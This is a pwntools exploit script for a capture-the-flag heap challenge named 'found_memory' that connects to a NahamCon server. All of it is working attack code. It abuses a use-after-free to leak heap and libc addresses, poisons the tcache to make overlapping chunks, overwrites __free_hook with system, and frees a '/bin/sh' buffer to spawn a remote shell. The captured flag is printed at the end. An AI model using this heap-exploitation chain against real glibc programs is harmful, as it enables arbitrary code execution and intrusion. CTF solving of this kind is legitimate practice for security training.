from pwn import *

# obiviously UAF

exe = ELF("./found_memory_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

def malloc():
    p_sa(b"> ", b"1")

def free(index):
    p_sa(b"> ", b"2")
    p_sa(b"free: ", f"{index}".encode())

def view(index):
    p_sa(b"> ", b"3")
    p_sa(b"view: ", f"{index}".encode())

def edit(index, data):
    p_sa(b"> ", b"4")
    p_sa(b"edit: ", f"{index}".encode())
    p_sa(b"data: ", data)

script = '''
'''

p = remote("challenge.nahamcon.com", 32712)
#p = process("./found_memory_patched")
#debug()

# leak heap
## also prepare many chunk to create fake unsortedbin chunk
for i in range(23):
    malloc()
free(1)
free(0)
view(0)
heap_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x2e0
print(hex(heap_base))

# tcache poisoning -> make overlapping chunk
edit(0, p64(heap_base + 0x300))
malloc()
malloc() # index 1 - overlap chunk

# create fake unsortedbin
edit(1, b"A" * 0x18 + p64(0x501))
## now index_2 is unsorted chunk

# leak libc
free(2)
view(2)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x1ecbe0
print(hex(libc_base))


# tcache poisoning -> __free_hook to system
__free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
free(4)
free(3)
edit(3, p64(__free_hook))
malloc()
malloc() # index 3 now is __free_hook
edit(3, p64(system))

# trigger
edit(5, b"/bin/sh\x00")
free(5)

p.interactive()
#flag{04b12c28513188fbf6513f8d080b9ee1}